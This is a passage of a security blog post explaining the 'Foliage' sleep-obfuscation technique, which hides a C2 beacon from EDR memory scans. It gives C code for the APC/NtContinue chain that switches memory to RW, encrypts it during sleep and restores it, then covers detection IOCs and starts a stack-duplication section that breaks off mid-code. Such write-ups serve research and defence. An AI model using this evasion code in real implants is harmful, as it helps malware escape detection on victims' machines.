# https://oblivion-malware.xyz/posts/sleep-obf-foliage/

<!DOCTYPE html><html lang="en"><body><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Evading detection in memory - Pt 1: Sleep Obfuscation - Foliage</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h1 id="introduction">Introduction</h1><p>First, we will talk about the types of memory. They are:</p><ul><li><strong>PRIVATE</strong> ‚Äì Not shared with other processes and its protection can be changed after allocation. Note: APIs such as <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a> are used, which are means to call <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory">NtAllocateVirtualMemory</a>.</li><li><strong>MAPPED</strong> ‚Äì Can be shared with other processes, and its protection cannot be changed after allocation. Note: One way to achieve this is <a href="https://learn.microsoft.com/pt-br/windows/win32/api/winbase/nf-winbase-createfilemappinga">CreateFileMapping</a> + <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile">MapViewOfFile</a>.</li><li><strong>IMAGE</strong> ‚Äì Refers to memory that has a backup on disk. For example, the executable that starts the process and the loaded DLLs.</li></ul><p>These are categories that represent the values of the <code class="language-plaintext highlighter-rouge">Type</code> parameter in the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information">MEMORY_BASIC_INFORMATION</a> structure, which can be retrieved using the base address of memory passed to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualquery">VirtualQuery</a> API. The most commonly used memory type by malware is private memory, because it allows the protection of memory to be modified at runtime, unlike mapped memory. Command and Control (C2) implants/agents/beacons use <a href="https://oblivion-malware.xyz/posts/shellcode-reflective-dll-injection/">shellcode Reflection DLL Injection (sRDI)</a> to create shellcode based on a beacon DLL. This technique can be used with evasion loaders to bypass defense solutions.</p><p></p><p>The loader doesn‚Äôt need to use a complex technique, as it will only be a Proof of Concept (PoC). First, the injection process occurs, regardless of the evasion technique used. Then, the <a href="https://oblivion-malware.xyz/posts/shellcode-reflective-dll-injection/">shellcode Reflection DLL Injection (sRDI)</a> specifically acts on the part highlighted in red, reflecting the PE DLL into another private memory space, containing only the sections, and executing the entry point.</p><h2 id="detection-in-memory"><span class="me-2">Detection in memory</span><a href="https://oblivion-malware.xyz/posts/sleep-obf-foliage/#detection-in-memory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A memory scan consumes significant computational resources, so the EDR uses criteria to determine where to perform the scan. Among these criteria are memory spaces without backups that have execution permissions, which would signal our beacon. The raw data is also compared with a <code class="language-plaintext highlighter-rouge">signature/rules</code> database. Another way to detect our beacon is by analyzing the <code class="language-plaintext highlighter-rouge">call stack</code> of the thread. The return of post-exploitation commands and beacon calls in the sleep state would point to our private memory where the beacon resides, indicating that the code is being executed from that address.</p><p>In this blog, we will cover how to keep the implant obfuscated in memory, hide execution permissions, and conceal the main code. This approach helps avoid detection by memory scans and prevents analysis by ensuring the memory region has no execute permissions.</p><h2 id="sleep-obfuscation"><span class="me-2">Sleep Obfuscation</span><a href="https://oblivion-malware.xyz/posts/sleep-obf-foliage/#sleep-obfuscation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Sleep Obfuscation is a technique we can use to hide our beacon in memory from potential memory scans. Essentially, we follow the chain below:</p><ol><li>Change the memory protection from RX to RW</li><li>Encrypt the memory region</li><li>Put the process to sleep for a defined period</li><li>Decrypt the memory region</li><li>Change the memory permission from RW back to RX</li><li>Execute a post-exploitation command from the C2, if available</li><li>Repeat the obfuscation chain</li></ol><p>Now you must be wondering:</p><ul><li>‚ÄúHow do we proceed to the next step after changing the memory protection to RW? We no longer have execution permissions.‚Äù</li></ul><p>At least, I hope you‚Äôre asking yourself this question üòÅ. Well, it would indeed be impossible to execute any instructions with memory in RW without the execution permission, and this is where we use ROP chains (Return-Oriented Programming) with timers or <a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">APCs</a> (Asynchronous Procedure Calls), which are the well-known methods to achieve this.</p><h3 id="key-concepts-rop-chains-timers-and-apcs"><span class="me-2">Key Concepts: ROP Chains, Timers and APCs</span><a href="https://oblivion-malware.xyz/posts/sleep-obf-foliage/#key-concepts-rop-chains-timers-and-apcs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="table-wrapper"><table><thead><tr><th><strong>Technique</strong></th><th><strong>Details</strong></th></tr></thead><tbody><tr><td><strong>ROP Chains</strong></td><td>Return-Oriented Programming is a technique where small chunks of executable code (gadgets) are reused to construct a chain of instructions that can perform arbitrary actions. These are useful when direct execution is not possible.</td></tr><tr><td><strong>Timers</strong></td><td>Timers can be used in ROP chains to schedule the execution of a specific function after a delay. This is useful when you want to control when a piece of code executes after the memory state has been modified.</td></tr><tr><td><strong>APCs</strong></td><td>Asynchronous Procedure Calls allow you to queue functions to be executed in the context of a thread. This technique can help to run code in a specific thread without needing immediate execution permissions.</td></tr></tbody></table></div><h1 id="foliage">Foliage</h1><p>In this article, we will use foliage, which is a sleep obfuscation technique based on <a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">APC</a>. Simplifying the flow of foliage to perform Sleep Obfuscation, it will work as follows:</p><ol><li>We will create a synchronization event using the NTAPI call <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-zwcreateevent">NtCreateEvent</a>.</li></ol><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">Status</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtCreateEvent</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">EvtSync</span><span class="p">,</span> <span class="n">EVENT_ALL_ACCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">SynchronizationEvent</span><span class="p">,</span> <span class="n">FALSE</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">Status</span> <span class="o">!=</span> <span class="mh">0x00</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">PrintErr</span><span class="p">(</span> <span class="s">"NtCreateEvent"</span><span class="p">,</span> <span class="n">Status</span> <span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><ol><li>We will create a suspended thread (the thread where the chain mentioned above will be executed).</li></ol><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">Status</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtCreateThreadEx</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">hSlpThread</span><span class="p">,</span> <span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">NtCurrentProcess</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="mi">20</span><span class="p">,</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="mi">20</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">Status</span> <span class="o">!=</span> <span class="mh">0x00</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">PrintErr</span><span class="p">(</span> <span class="s">"NtCreateThreadEx"</span><span class="p">,</span> <span class="n">Status</span> <span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><ol><li>We will retrieve the context of the created thread and transfer it to other <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">CONTEXT</a> structures, where the chain will be constructed.</li></ol><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">CtxMain</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>
<span class="n">Status</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtGetContextThread</span><span class="p">(</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CtxMain</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">Status</span> <span class="o">!=</span> <span class="mh">0x00</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">PrintErr</span><span class="p">(</span> <span class="s">"NtGetContextThread"</span><span class="p">,</span> <span class="n">Status</span> <span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><ol><li>We will set the Rsp register to always return to <a href="https://ntdoc.m417z.com/nttestalert">NtTestAlert</a>. This is done because <a href="https://ntdoc.m417z.com/nttestalert">NtTestAlert</a> checks if there are any pending APCs to be executed. If so, they will be executed.</li></ol><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">*</span><span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="n">CtxMain</span><span class="p">.</span><span class="n">Rsp</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtTestAlert</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><ol><li>After populating the other <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">CONTEXT</a> structures with the values returned in CtxMain, we can finally execute the chain.</li></ol><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre></td><td class="rouge-code"><pre><span class="cm">/* 
 * wait EvtSync gets triggered
 * NtWaitForGingleObject( EvtSync, FALSE, NULL ); 
 */</span>
<span class="n">RopSetEvt</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">NtWaitForSingleObject</span><span class="p">;</span>
<span class="n">RopSetEvt</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">EvtSync</span><span class="p">;</span>
<span class="n">RopSetEvt</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="n">RopSetEvt</span><span class="p">.</span><span class="n">R9</span>  <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="cm">/*
 * Change implant protection to RW
 * VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &amp;OldProt ); 
 */</span>
<span class="n">RopProtRw</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">;</span>
<span class="n">RopProtRw</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">ImageBase</span><span class="p">;</span>
<span class="n">RopProtRw</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">ImageSize</span><span class="p">;</span>
<span class="n">RopProtRw</span><span class="p">.</span><span class="n">R8</span>  <span class="o">=</span> <span class="n">PAGE_READWRITE</span><span class="p">;</span>
<span class="n">RopProtRw</span><span class="p">.</span><span class="n">R9</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">OldProt</span><span class="p">;</span>

<span class="cm">/*
 * memory encryption
 * SystemFunction( &amp;Img, &amp;Key );
 */</span>
<span class="n">RopMemEnc</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">SystemFunction040</span><span class="p">;</span>
<span class="n">RopMemEnc</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">ImageBase</span><span class="p">;</span>
<span class="n">RopMemEnc</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">ImageSize</span><span class="p">;</span>

<span class="cm">/*
 * delay
 * WaitForSingleObjectEx( NtCurrentProcess(), SleepTime, FALSE );
 */</span>
<span class="n">RopDelay</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">WaitForSingleObjectEx</span><span class="p">;</span>
<span class="n">RopDelay</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">NtCurrentProcess</span><span class="p">();</span>
<span class="n">RopDelay</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">SleepTime</span><span class="p">;</span>
<span class="n">RopDelay</span><span class="p">.</span><span class="n">R8</span>  <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>

<span class="cm">/*
 * memory decryption
 * SystemFunction( &amp;Img, &amp;Key );
 */</span>
<span class="n">RopMemDec</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">SystemFunction041</span><span class="p">;</span>
<span class="n">RopMemDec</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">ImageBase</span><span class="p">;</span>
<span class="n">RopMemDec</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">ImageSize</span><span class="p">;</span>

<span class="cm">/*
 * change memory to execute and read
 * VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READ, &amp;oldProt );
 */</span>
<span class="n">RopProtRx</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">VirtualProtect</span><span class="p">;</span>
<span class="n">RopProtRx</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">ImageBase</span><span class="p">;</span>
<span class="n">RopProtRx</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="n">ImageSize</span><span class="p">;</span>
<span class="n">RopProtRx</span><span class="p">.</span><span class="n">R8</span>  <span class="o">=</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">;</span>
<span class="n">RopProtRx</span><span class="p">.</span><span class="n">R9</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">OldProt</span><span class="p">;</span>

<span class="cm">/*
 * exit thread
 * RtlExitUserThread( 0x00 );
 */</span>
<span class="n">RopExit</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">RtlExitUserThread</span><span class="p">;</span>
<span class="n">RopExit</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>

</pre></td></tr></tbody></table></code></div></div><ol><li>Now, we enqueue the <a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">APC</a> with the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">CONTEXT</a> structures and pass it as a parameter to <a href="https://ntdoc.m417z.com/ntcontinue">NtContinue</a>.</li></ol><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtQueueApcThread</span><span class="p">(</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopSetEvt</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
<span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtQueueApcThread</span><span class="p">(</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopProtRw</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
<span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtQueueApcThread</span><span class="p">(</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopMemEnc</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
<span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtQueueApcThread</span><span class="p">(</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopDelay</span> <span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
<span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtQueueApcThread</span><span class="p">(</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopMemDec</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
<span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtQueueApcThread</span><span class="p">(</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopProtRx</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
<span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtQueueApcThread</span><span class="p">(</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtContinue</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RopExit</span>  <span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div><ol><li>Finally, we will resume the thread, trigger the synchronization event, and let it run while the current thread sleeps.</li></ol><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">Status</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtAlertResumeThread</span><span class="p">(</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">Status</span> <span class="o">!=</span> <span class="mh">0x00</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">PrintErr</span><span class="p">(</span> <span class="s">"NtAlertResumeThread"</span><span class="p">,</span> <span class="n">Status</span> <span class="p">);</span>
<span class="p">}</span>

<span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span> <span class="s">"[I] Trigger sleep obf chain</span><span class="se">\n\n</span><span class="s">"</span> <span class="p">);</span>

<span class="n">Status</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">.</span><span class="n">NtSignalAndWaitForSingleObject</span><span class="p">(</span> <span class="n">EvtSync</span><span class="p">,</span> <span class="n">hSlpThread</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">Status</span> <span class="o">!=</span> <span class="mh">0x00</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">PrintErr</span><span class="p">(</span> <span class="s">"NtSignalAndWaitForSingleObject"</span><span class="p">,</span> <span class="n">Status</span> <span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h1 id="demo">Demo</h1><p>Opening our implant in <a href="https://x64dbg.com/">x64dbg</a> and setting breakpoints on the routine functions of the chain to see the step-by-step process. We will also use software that provides more information about processes. In this case, I will be using <a href="https://processhacker.sourceforge.io/">Process Hacker</a>, but alternatively, <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> from Sysinternals can be used.</p><p></p><p>The loader we use provides us with the base allocation address. Now, below we will access the address.</p><p></p><p>Deobfuscated region</p><p></p><p>At this point, we have plaintext strings, and the memory region is separated into RX and RW. Now, we will see the result of the first <a href="https://learn.microsoft.com/pt-br/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a>.</p><p></p><p>Executing <a href="https://learn.microsoft.com/pt-br/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a> RX ‚Üí RW</p><p></p><p>Result of Executing <a href="https://learn.microsoft.com/pt-br/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a> RX ‚Üí RW</p><p>After execution, the memory region was set to RW as expected. The next step is to encrypt it using <code class="language-plaintext highlighter-rouge">SystemFunction040</code>.</p><p></p><p>Executing <code class="language-plaintext highlighter-rouge">SystemFunction040</code> to encrypt the memory area</p><p></p><p>Next, we can observe the obfuscated memory region. This is how we find it during sleep. Now, we proceed to decrypt it using <code class="language-plaintext highlighter-rouge">SystemFunction041</code>.</p><p></p><p>Executing <code class="language-plaintext highlighter-rouge">SystemFunction041</code></p><p></p><p>Above, the decrypted data, and the memory region returns to 12KB RX and 4KB RW.</p><p></p><p>When analyzing with the memory analysis tool called <a href="https://github.com/hasherezade/pe-sieve">pe-sieve</a>, we obtain the following results:</p><p></p><h1 id="detections-and-iocs">Detections and IOCs</h1><p>As mentioned earlier, one way to analyze a process is by inspecting the thread stack and observing the calling function. This method can be used to flag our implant, as during the sleep state, the thread will be pointing back to the memory region set to RW. This is problematic for us, as it makes detection easier.</p><p>post-ex activity:</p><p></p><p>Sleep routine:</p><p></p><p>Looking at <a href="https://github.com/forrest-orr/moneta">moneta</a> we can note the IOC previously mentioned.</p><p></p><p>Another method of detection involves the callback from <a href="https://learn.microsoft.com/pt-br/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a> to <a href="https://ntdoc.m417z.com/nttestalert">NtTestAlert</a>, which is commonly used for security monitoring. For example, Elastic EDR leverages this IOC (Indicator of Compromise) to detect suspicious activity, <a href="https://github.com/elastic/protections-artifacts/blob/136fd6e69610426de969e3d01b98bb9ce10607b2/behavior/rules/windows/defense_evasion_virtualprotect_call_via_nttestalert.toml#L4">rule here</a>.</p><h1 id="stack-duplication">Stack Duplication</h1><p>Regarding this moneta IOC it is about the <strong>Stack</strong> containing <a href="https://ntdoc.m417z.com/ntsignalandwaitforsingleobject"><strong>NtSignalAndWaitForSingleObject</strong></a> that stays during sleep. We managed to solve this using something called <code class="language-plaintext highlighter-rouge">Stack Duplication</code> in which we will clone all thread properties including registers, stack/stack (where it will contain the return addresses) and so on. Starting steps:</p><p>Look for another thread running in the process and use the API [<strong>NtGetContextThread](https://ntdoc.m417z.com/ntgetcontextthread)/<a href="https://ntdoc.m417z.com/ntsetcontextthread">NtSetContextThread</a></strong> to get the properties and <a href="https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle"><strong>DuplicateHandle</strong></a> to duplicate the found thread</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="n">Status</span> <span class="o">=</span> <span class="n">bkThreadOpen</span><span class="p">(</span>
	<span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">DupThreadId</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">DupThreadHandle</span> 
<span class="p">);</span>    
<span class="n">Status</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">().</span><span class="n">DuplicateHandle</span><span class="p">(</span>
	<span class="n">NtCurrentProcess</span><span class="p">(),</span> <span class="n">NtCurrentThread</span><span class="p">(),</span> <span class="n">NtCurrentProcess</span><span class="p">(),</span> 
	<span class="o">&amp;</span><span class="n">MainThreadHandle</span><span class="p">,</span> <span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span> 
<span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div><p>Perform a backup of the state of the current thread and set the thread that we decided to impersonate the properties within the obfuscation routine</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>  <span class="n">RopCtxGetBkp</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">().</span><span class="n">NtGetContextThread</span><span class="p">;</span>
  <span class="n">RopCtxGetBkp</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">MainThreadHandle</span><span class="p">;</span>
  <span class="n">RopCtxGetBkp</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">CtxBkp</span><span class="p">;</span>

  <span class="n">RopCtxSetSpf</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">().</span><span class="n">NtSetContextThread</span><span class="p">;</span>
